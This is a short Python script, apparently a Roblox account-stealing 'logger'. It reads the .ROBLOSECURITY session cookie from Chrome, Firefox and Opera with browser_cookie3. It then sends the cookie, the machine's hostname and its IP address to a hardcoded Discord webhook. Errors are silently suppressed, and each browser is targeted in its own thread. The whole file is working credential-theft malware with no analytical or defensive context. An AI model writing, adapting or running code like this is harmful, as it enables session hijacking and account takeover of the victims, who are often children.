hook = "https://discord.com/api/webhooks/1062582250694262865/9K81cWicCb3NWakTpA1XN9bvdUXZfYWeYALrbU6mllgri8RAKqlLYwrPpdHdecbur64I" 



# logger 



import browser_cookie3, requests, threading, base64, socket



hostname=socket.gethostname()

IPAddr=socket.gethostbyname(hostname)




try:
 weok = base64.b64decode(hook)
except:
 weok = hook



def chrome_logger():

    try:

        cookies = browser_cookie3.chrome(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'Roblox Beam', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass





def firefox_logger():

    try:

        cookies = browser_cookie3.firefox(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass



def opera_logger():

    try:

        cookies = browser_cookie3.opera(domain_name='roblox.com')

        cookies = str(cookies)

        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()

        requests.post(weok, json={'username':'LOGGER', 'content':f'```Hostname: {hostname} IP: {IPAddr} Cookie: {cookie}```'})

    except:

        pass



browsers = [chrome_logger, firefox_logger, opera_logger]



for x in browsers:

    threading.Thread(target=x,).start()
